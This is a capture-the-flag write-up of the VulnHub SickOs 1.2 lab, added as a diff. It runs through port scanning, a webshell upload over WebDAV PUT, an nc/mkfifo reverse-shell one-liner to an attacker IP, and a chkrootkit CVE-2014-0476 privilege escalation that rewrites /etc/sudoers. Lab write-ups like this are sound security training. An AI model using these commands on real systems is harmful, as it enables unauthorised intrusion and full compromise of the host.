@@ -1,0 +1,198 @@
+
+IP - 10.0.2.14
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Nmap Result
+
+┌──(root㉿kali)-[~/Desktop/vulhub/Sick0s1.2]
+└─# nmap -sC -sV 10.0.2.14 -p- -oN nmap_all_port.txt
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-20 00:20 +0630
+Nmap scan report for 10.0.2.14
+Host is up (0.00023s latency).
+Not shown: 65533 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 668cc0f2857c6cc0f6ab7d480481c2d4 (DSA)
+|   2048 ba86f5eecc83dfa63ffdc134bb7e62ab (RSA)
+|_  256 a16cfa18da571d332c52e4ec97e29eaf (ECDSA)
+80/tcp open  http    lighttpd 1.4.28
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: lighttpd/1.4.28
+MAC Address: 08:00:27:67:43:F1 (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 121.49 seconds
+
+
+Dirsearch Result
+
+┌──(root㉿kali)-[~]
+└─# dirsearch -u http://10.0.2.14/ -e php -f -x 400,403              
+
+  _|. _ _  _  _  _ _|_    v0.4.2
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 13441
+
+Output File: /root/.dirsearch/reports/10.0.2.14/-_23-01-20_00-26-05.txt
+
+Error Log: /root/.dirsearch/logs/errors-23-01-20_00-26-05.log
+
+Target: http://10.0.2.14/
+
+[00:26:05] Starting: 
+[00:26:27] 200 -  163B  - /index.php                                        
+[00:26:27] 200 -  163B  - /index.php/login/                                 
+[00:26:43] 200 -    1KB - /test/                                            
+[00:26:43] 301 -    0B  - /test  ->  http://10.0.2.14/test/                 
+                                                                             
+Task Completed
+
+I go to http://10.0.2.14/test/ check and there is no file and folder.
+
+I catch the request with burp suite and try switching method GET,POST,HEAD, and OPTIONS.
+
+After running with OPTIONS method found 
+
+Request:
+
+OPTIONS /test/ HTTP/1.1
+Host: 10.0.2.14
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+Response:
+
+HTTP/1.1 200 OK
+DAV: 1,2
+MS-Author-Via: DAV
+Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
+Allow: OPTIONS, GET, HEAD, POST
+Content-Length: 0
+Connection: close
+Date: Thu, 19 Jan 2023 19:00:49 GMT
+Server: lighttpd/1.4.28
+
+
+We can upload whatever we like with PUT method.So, I decided to upload my webshell with curl upload.
+
+curl --upload-file __welcome.php -v --url http://10.0.2.14/test/__welcome.php -0 --http1.0
+
+*   Trying 10.0.2.14:80...
+* Connected to 10.0.2.14 (10.0.2.14) port 80 (#0)
+> PUT /test/__welcome.php HTTP/1.0
+> Host: 10.0.2.14
+> User-Agent: curl/7.85.0
+> Accept: */*
+> Content-Length: 179123
+> 
+* We are completely uploaded and fine
+* Mark bundle as not supporting multiuse
+* HTTP 1.0, assume close after body
+< HTTP/1.0 201 Created
+< Content-Length: 0
+< Connection: close
+< Date: Thu, 19 Jan 2023 19:14:10 GMT
+< Server: lighttpd/1.4.28
+< 
+* Closing connection 0
+
+Now, I got webshell.
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+I tried get every port 4444,5555,etc... nothing work.
+
+So, I decided to try with port 443.
+
+Boom! I got reverse shell.
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.100.29 443 >/tmp/f
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Priv Escalation
+
+After running linpeas.sh, I found chkrootkit at crontab and potentially added by user. Also from local exploit suggester.
+
+[+] [CVE-2014-0476] chkrootkit
+
+   Details: http://seclists.org/oss-sec/2014/q2/430
+   Exposure: less probable
+   Download URL: https://www.exploit-db.com/download/33899
+   Comments: Rooting depends on the crontab (up to one day of delay)
+
+╔══════════╣ Cron jobs
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                                                                      
+/usr/bin/crontab                                                                                                                                                                            
+incrontab Not Found
+-rw-r--r-- 1 root root     722 Jun 19  2012 /etc/crontab                                                                                                                                    
+
+/etc/cron.daily:
+total 72
+drwxr-xr-x  2 root root  4096 Apr 12  2016 .
+drwxr-xr-x 84 root root  4096 Jan 19 11:48 ..
+-rw-r--r--  1 root root   102 Jun 19  2012 .placeholder
+-rwxr-xr-x  1 root root 15399 Nov 15  2013 apt
+-rwxr-xr-x  1 root root   314 Apr 18  2013 aptitude
+-rwxr-xr-x  1 root root   502 Mar 31  2012 bsdmainutils
+-rwxr-xr-x  1 root root  2032 Jun  4  2014 chkrootkit <---------------------------(Here)
+
+
+╔══════════╣ Executable files potentially added by user (limit 70)
+2016-04-12+20:27:18.5461149080 /etc/rc.local                                                                                                                                                
+2016-04-12+09:20:54.4780487640 /usr/sbin/chkrootkit <-------------------------(Here)
+
+
+
+I research it about for priv escalation and found below article for priv escalation:
+
+https://vk9-sec.com/chkrootkit-0-49-local-privilege-escalation-cve-2014-0476/
+
+1. First step to exploit this vulnerability, we need to create a file named ‘update’ in /tmp directory, with a bash command, and, make the file executable
+
+    echo 'mkdir /tmp/vry4n' > /tmp/update
+    chmod 777 /tmp/update
+
+2. Now execute the chkrootkit command using root. In this particular case, I found a cron job running it as root, I had to wait for it to execute automatically, after a while I found the new directory named ‘vry4n’, the owner is root
+
+    ls -l /tmp
+
+3. Knowing the previous command executed, we can modify files, we can add privileges to our current user www-data by modifying /etc/sudoers
+
+    echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
+    cat update
+    ls -l
+
+4. Again I’d wait for the cron job to execute as root, then log in as root using ‘sudo su’
+
+    sudo su
+    whoami
+
+
+
+Boom! I got root:
+
+www-data@ubuntu:/tmp$ sudo su
+root@ubuntu:/tmp# whoami
+root
+
+Root Flag
+
+root@ubuntu:~# cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt 
+WoW! If you are viewing this, You have "Sucessfully!!" completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.
+
+Thanks for giving this try.
+
+@vulnhub: Thanks for hosting this UP!.
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
